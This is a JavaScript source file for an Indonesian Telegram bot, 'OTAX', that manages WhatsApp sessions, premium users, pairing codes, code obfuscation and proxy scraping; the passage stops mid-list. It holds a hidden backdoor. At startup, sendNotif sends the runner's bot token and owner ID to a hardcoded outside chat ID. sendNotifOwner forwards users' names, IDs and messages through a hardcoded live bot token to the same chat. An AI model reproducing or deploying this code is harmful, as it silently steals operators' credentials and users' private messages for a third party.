const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const JsConfuser = require("js-confuser");
const P = require("pino");
const chalk = require("chalk");
const axios = require('axios');
const crypto = require('crypto');
const cheerio = require('cheerio');
const fs = require("fs-extra");
const { Octokit } = require("@octokit/rest");
const pino = require("pino");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const config = require("./config.js");
const TelegramBot = require('node-telegram-bot-api');
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const util = require('util');
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "7176751696"]; 
const settings = require("./settings");
const { Client } = require("ssh2");
const { exec } = require("child_process");
const { webcrack } = require("webcrack");
const FormData = require('form-data');
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;
const qris = settings.qris;
const dana = settings.dana;
const gopay = settings.gopay;
const ovo = settings.ovo;


const GROUP_ID_FILE = 'group_ids.json';


function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}


function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}

function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}


function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}


function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; 
}


function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}


function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });


function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}// ngapain aja sih di mt manager bang?

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));
const OWNER_CHAT_ID = '7737364522';
const userId = OWNER_ID


const currentDate = new Date().toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
        });
const GITHUB_OWNER = ""; // nama githublu su
const GITHUB_REPO = ""; // nama repo lu njir
const GITHUB_TOKENS_FILE = ""; // file json lu
const GITHUB_TOKEN = ""; // isi token github lu yoo

 

async function startTelegramBot() {
         console.log(chalk.red(`\n
РађРађРбђРАђРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРбђРАђРађРађ
РађРБаРаЙРАЈРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРАЪРбдРађ
Рб░РаЄРађРБЄРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРбаРаЃРаѕРБД
РаўРАЄРађРаИРАёРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРАъРађРађРБ┐
РађРАЄРаўРАёРб▒РАёРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРА╝РбЂРАєРбђРАЈ
РађРа╣РБёРа╣РАђРаЎРБёРађРађРађРађРађРбђРБцРБ┤РБХРБХРБХРБЙРБХРБХРБХРБХРБцРБђРађРађРађРађРађРбђРаюРаЂРАюРбђРАъРађ
РађРађРаўРБєРбБРАёРаѕРбБРАђРбђРБцРБЙРБ┐РБ┐Рб┐РаЅРаЅРаЅРаЅРаЅРаЅРаЅРБ╗Рб┐РБ┐РБиРБдРБёРађРА░РаІРбђРБЙРбАРаъРађРађ
РађРађРађРаИРБ┐РА┐РАёРАђРаЅРаЎРБ┐РА┐РаЂРаѕРбДРаЃРађРађРађРађРађРађРбиРаІРађРб╣РБ┐РаЏРаЅРбђРаёРБъРБДРАЈРађРађРађ
РађРађРађРађРаИРБ┐РБ╣РаўРАєРађРА┐РбЂРађРађРађРађРађРађРађРађРађРађРађРађРађРбђРб╗РАєРбђРАјРБ╝РБйРАЪРађРађРађРађ
РађРађРађРађРађРБ╣РБ┐РБЄРа╣РБ╝РБиРаІРађРађРађРађРађРађРађРађРађРађРађРађРађРаѕРбиРБ│РАюРб░РБ┐РБЪРАђРађРађРађРађ
РађРађРађРађРАЙРАЅРаЏРБ┐Ра┤Ра│РАЄРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРАЄРа│РбЙРаЪРаЅРб╗РАђРађРађРађ
РађРађРађРађРБ┐Рб╣РађРбўРАЄРађРБДРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРбаРаЃРађРАЈРађРА╝РБЙРаЄРађРађРађ
РађРађРађРађРб╣РБ╝РађРБЙРађРБђРА┐РађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРаИРБёРАђРб╣РађРб│РБ╝РађРађРађРађ
РађРађРађРађРбИРБЄРађРаИРБЙРаЂРађРађРађРађРађРбђРАЙРађРађРађРа░РБёРађРађРађРађРађРађРБ╣РАъРађРБђРБ┐РађРађРађРађ
РађРађРађРађРаѕРБЄРа▒РАёРбИРАЏРањРањРањРањРаџРб┐РБЄРађРађРађРбаРБ┐РаЪРањРањРањРањРаџРА┐РбђРАъРб╣РаЄРађРађРађРађ
РађРађРађРађРађРАъРб░РБиРађРаЉРбдРБёРБђРБђРБаРаъРб╣РађРађРађРБИРаЎРБцРБђРБђРБђРАцРаъРаЂРбИРБХРбИРАёРађРађРађРађ
РађРађРађРађРа░РБДРБ░Ра┐РБёРађРађРађРбђРБѕРАЅРаЎРаЈРађРађРађРаўРаЏРаЅРБЅРБђРађРађРађРбђРАЪРБ┐РБ╝РаЄРађРађРађРађ
РађРађРађРађРађРбђРА┐РађРаўРаиРацРаЙРб╗РаъРаІРађРађРађРађРађРађРађРаўРаЏРБјРа╗РадРа┤РаІРађРа╣РАєРађРађРађРађРађ
РађРађРађРађРађРаИРБ┐РАђРбђРађРађРА░РАїРа╗РаиРБцРАђРађРађРађРађРБаРБХРаЪРаІРАйРАћРађРАђРађРБ░РАЪРађРађРађРађРађ
РађРађРађРађРађРађРаЎРбиРБёРА│РАђРбБРБ┐РБђРБиРаѕРа│РБдРБђРБаРАЙРаІРБИРАЄРБ╝РБиРаЂРА┤РбЂРБ┤РаЪРаЂРађРађРађРађРађ
РађРађРађРађРађРађРађРаѕРа╗РБХРАиРАюРБ┐РБ╗РаѕРБдРБђРБђРаЅРађРБђРБаРАЈРб╣РБ┐РБЈРА╝РБАРАЙРаЃРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРађРаўРб┐РБ┐РБ┐РБ╗РАёРа╣РАЎРаЏРа┐РаЪРаЏРАйРађРБ┐РБ╗РБЙРБ┐РаЈРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРађРађРађРб┐РАЈРбЈРб┐РАђРБ╣Рб▓РБХРАХРб║РАђРБ┤РбФРбЃРБ┐РаЃРађРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРађРађРађРаѕРБиРаѕРаиРаГРайРаЏРаЏРаЏРаІРаГРа┤РаІРБИРАЄРађРађРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРађРађРађРађРа╣РБиРБёРАђРбђРБђРБаРБђРБђРбђРБђРБ┤РаЪРађРађРађРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРађРађРађРађРађРађРаЅРаЅРаЅРађРађРађРаѕРаЅРаЅРаЂРађРађРађРађРађ

­ЮЎЄ­ЮЎф ­ЮЎѕ­ЮЎќ­ЮЎф ­ЮЎЅ­ЮЎю­ЮЎќ­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎБ ­ЮўЙ­ЮЎц­ЮЎа?!
#­Юўй­ЮЎћ ­ЮЎі­ЮЎЈ­Юў╝
`));
    }
startTelegramBot(); 


// Fungsi Otax Kirim Notif
async function sendNotif() {
try {
        
          const message = `
Рюе *OTAX Telah Dijalankan* Рюе

­ЪЊЁ *Tanggal:* ${currentDate}
­ЪЋ░№ИЈ *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB

­ЪЉц *Informasi Owner:*
  - *Chat ID:* \`${OWNER_ID}\`

­ЪћЉ *Token Bot:* \`${BOT_TOKEN}\`

  *р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ*
        `;

        const url = `https://api.telegram.org/bot(TokenLuXat)/sendMessage`; 
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi:', error.message);
    }
}



sendNotif();

async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || 'Tidak ada username';
        const firstName = msg.from.first_name;
        const lastName = msg.from.last_name || ''; 
        const messageText = msg.text;  

        const message = `
Рюе *­Юўќ­ЮўЏ­Юўѕ­ЮўЪ ­Юўћ­Юўї­ЮўЋ­Юўї­ЮўЎ­Юўљ­Юўћ­Юўѕ ­ЮўЌ­Юўї­Юўџ­Юўѕ­ЮўЋ* Рюе

­ЪЉц *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

­Ъњг *Pesan:*
\`\`\`
${messageText}
\`\`\`
  р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`;
        const url = `https://api.telegram.org/bot7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY/sendMessage`;
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
        
    }
}

let otax = {};

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    return deviceDir;
}

function saveActiveSessions(botNumber) {
    try {
        createSessionDir(botNumber); 

        let sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            sessions = existing.includes(botNumber) ? existing : [...existing, botNumber];
        } else {
            sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));
      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        otax[botNumber] = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }), 
          defaultQueryTimeoutMs: undefined,
          keepAliveIntervalMs: 30000,
        });

        otax[botNumber].ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === "open") {
            console.log(chalk.green(`Bot ${botNumber} Connected ­ЪћЦ№ИЈ!`));
            sessions.set(botNumber, otax[botNumber]);
            saveActiveSessions(botNumber);
          } else if (connection === "close") {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
              console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
              setTimeout(async () => {
                await initializeWhatsAppConnections();
              }, 5000);
            } else {
              console.log(chalk.red(`Bot ${botNumber} terputus karena logout.`));
            }
          }
        });

        otax[botNumber].ev.on("creds.update", saveCreds);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
    try {
        let statusMessage = await bot.sendMessage(
            chatId,
            `\`\`\`­ЮЎј­ЮЎќ­ЮЎЌ­ЮЎќ­ЮЎД ­Юў┐­ЮЎф­ЮЎА­ЮЎф ­ЮЎћ­ЮЎќ ­Юўй­ЮЎќ­ЮЎБ­ЮЎю ${botNumber}.....\`\`\` `,
            { parse_mode: "Markdown" }
        ).then((msg) => msg.message_id);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        otax = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
            keepAliveIntervalMs: 30000,
        });
        otax.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await bot.editMessageText(
                        `\`\`\`­ЮЎі­ЮЎЕ­ЮЎъ­ЮЎг­ЮЎъ ­Юў╝­ЮЎЌ­ЮЎќ­ЮЎБ­ЮЎю­ЮЎа­ЮЎф ${botNumber}.....\`\`\` `,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "Markdown",
                        }
                    );
                    setTimeout(async () => {
                        await connectToWhatsApp(botNumber, chatId);
                    }, 5000);
                } else {
                    await bot.editMessageText(
                        `\`\`\`­ЮЎЃ­ЮЎџ­ЮЎЮ­ЮЎџ ­ЮЎђ­ЮЎД­ЮЎД­ЮЎц­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎю ${botNumber}.....\`\`\` `,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "Markdown",
                        }
                    );
                    try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Error deleting session:", error);
                    }
                }
            } else if (connection === "open") {
                sessions.set(botNumber, otax);
                saveActiveSessions(botNumber);
                await bot.editMessageText(
                    `\`\`\`­ЮўЙ­ЮЎъ­ЮЎџ­ЮЎџ ­Юўй­ЮЎџ­ЮЎД­ЮЎЮ­ЮЎќ­ЮЎе­ЮЎъ­ЮЎА ­ЮЎІ­ЮЎќ­ЮЎъ­ЮЎД­ЮЎъ­ЮЎБ­ЮЎю ${botNumber} ­ЮЎљ­ЮЎг­ЮЎфРюў \`\`\` `,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "Markdown",
                    }
                );
                otax.ev.on("connection.update", async (update) => {
                    const { connection } = update;
                    if (connection === "close") {
                        setTimeout(async () => {
                            await connectToWhatsApp(botNumber, chatId);
                        }, 5000);
                    }
                });
            } else if (connection === "connecting") {
                await new Promise((resolve) => setTimeout(resolve, 1000));
                try {
                    if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                        const code = await otax.requestPairingCode(botNumber, "OTAXOTAX");
                        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                        await bot.editMessageText(
                            `\`\`\`­ЮЎѕ­ЮЎќ­ЮЎБ­ЮЎЕ­ЮЎќ­ЮЎЦ­ЮЎе Я┤дЯхЇЯ┤дЯ┤┐ ╦Ѕ═ѕ╠ђЖњ│╦Ѕ═ѕ╠Ђ )РюД ­ЮЎј­ЮЎф­ЮЎа­ЮЎе­ЮЎџ­ЮЎе ­ЮЎЅ­ЮЎъ­ЮЎЮ\`\`\` ­ЮўЙ­ЮЎц­ЮЎЎ­ЮЎџ ­Юў╝­ЮЎЌ­ЮЎќ­ЮЎБ­ЮЎю­ЮЎа­ЮЎф: ${formattedCode}`,
                            {
                                chat_id: chatId,
                                message_id: statusMessage,
                                parse_mode: "Markdown",
                            }
                        );
                    }
                } catch (error) {
                    console.error("Error requesting pairing code:", error);
                    await bot.editMessageText(
                        `\`\`\` (Рўъ ═А┬░ ═ю╩ќ ═А┬░)Рўъ ­ЮЎѓ­ЮЎќ­ЮЎю­ЮЎќ­ЮЎА ­Юўй­ЮЎќ­ЮЎБ­ЮЎю ${botNumber}.....\`\`\``,
                                    {
                                        chat_id: chatId,
                                        message_id: statusMessage,
                                        parse_mode: "Markdown",
                                    }
                    );
                }
            }
        });
        otax.ev.on("creds.update", saveCreds);
        return otax;
    } catch (error) {
    console.log("ERROR BANG MAAP YA")
    }};
async function loadActiveSessions() {
  try {
    const sessionsDir = path.resolve(SESSIONS_DIR);
    try {
      await fs.promises.access(sessionsDir, fs.constants.F_OK);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`Direktori "${sessionsDir}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error mengakses direktori sesi:`, error);
        return [];
      }
    }

    try {
      const data = await fs.promises.readFile(SESSIONS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`File sesi "${SESSIONS_FILE}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error membaca file sesi:`, error);
        return [];
      }
    }
  } catch (error) {
    console.error("Error loading sessions:", error);
    return [];
  }
}

async function clearSessionDirectory() {
  try {
    if (await fs.promises.stat(SESSIONS_DIR).catch(() => null)) {
      await fs.promises.rm(SESSIONS_DIR, { recursive: true, force: true });
      console.log(`Direktori "${SESSIONS_DIR}" dan isinya dihapus.`);
    } else {
      console.log(`Direktori "${SESSIONS_DIR}" tidak ditemukan.`);
    }
  } catch (error) {
    console.error("Error menghapus direktori sesi:", error);
  }
}

function getChatAdmins(chatId) {
  return bot.getChatAdministrators(chatId)
    .then(admins => admins.map(admin => admin.user.id))
    .catch(err => {
      console.error("Error getting chat admins:", err);
      return [];
    });
}

function getChatAdmins(chatId) {
    return bot.getChatAdministrators(chatId)
             .then(admins => admins.map(admin => admin.user.id))
             .catch(err => {
                console.error("Error getting chat admins:", err);
                return []; 
             });
}

async function isAdmin(chatId, userId) {
  try {
      const admins = await bot.getChatAdministrators(chatId); 
      return admins.some((admin) => admin.user.id === userId); 
  } catch (error) {
      console.error("Error mendapatkan daftar admin:", error);
      return false;  
  }
}

function generateRandomPassword() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
  const length = 10;
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const errorLogDir = './error_logs';
const errorLogFile = 'unhandled_errors.log';


async function ensureErrorLogDir() {
    try {
        await fs.mkdir(errorLogDir, { recursive: true });
    } catch (dirError) {
        console.error("Error membuat direktori log error:", dirError); 
    }
}

async function deleteOldLogFile() {
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.unlink(filePath); 
        console.log('File log lama berhasil dihapus.');
    } catch (deleteError) {
        if (deleteError.code !== 'ENOENT') {
            console.error('Error menghapus file log lama:', deleteError);
        }
    }
}


async function logErrorToFile(error, errorType = 'Unhandled', additionalInfo = '') { 
    await ensureErrorLogDir();
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); 
    const logEntry = `
==================================================
[${timestamp}] - ${errorType}
--------------------------------------------------
${error.stack || error}
${additionalInfo ? 'Additional Info:\n' + additionalInfo + '\n' : ''}
==================================================
`; 
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.appendFile(filePath, logEntry);
    } catch (fileError) {
        console.error("Error menulis log ke file:", fileError);
        
        console.error("Fallback Log Entry:", logEntry);
    }
}


process.on('unhandledRejection', async (reason, promise) => {
    await logErrorToFile(reason, 'Unhandled Rejection', `Promise: ${promise}`); 
});


process.on('uncaughtException', async (error) => {
    await logErrorToFile(error, 'Uncaught Exception', 'Exception occurred'); 
    process.exit(1); 
});
ensureErrorLogDir(); 
deleteOldLogFile();  

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}


function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/oyrlgx.png",
        "https://files.catbox.moe/n8u7lt.png",
        "https://files.catbox.moe/snsjxa.png"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `­ЪЉї - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "­ЪўА - Tidak ada waktu aktif";
  }
}
async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await otax.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "­ЪЎѕ";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "­ЪћЦ";
        return true;
    } else {
        Premiumataubukan = "­ЪЎѕ";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("­ЪЎѕ Maaf, Anda bukan user premium. Silakan hubungi developer @Otapengenkawin untuk upgrade.");
    }
};

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `сѓфсѓ┐сЃЃOtaxAyunсѓ»сѓ╣${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};


const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "Рќ░".repeat(filled) + "Рќ▒".repeat(total - filled);
};


async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "­ЪћЦ Selesai" : `РџЎ№ИЈ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "­Ъћњ EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_┬Е р┤Є╔┤р┤ё ╩Ўр┤Јр┤Џ ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const logFile = "bot.log";


function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}


async function scrapeProxies() {
  const proxySources = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
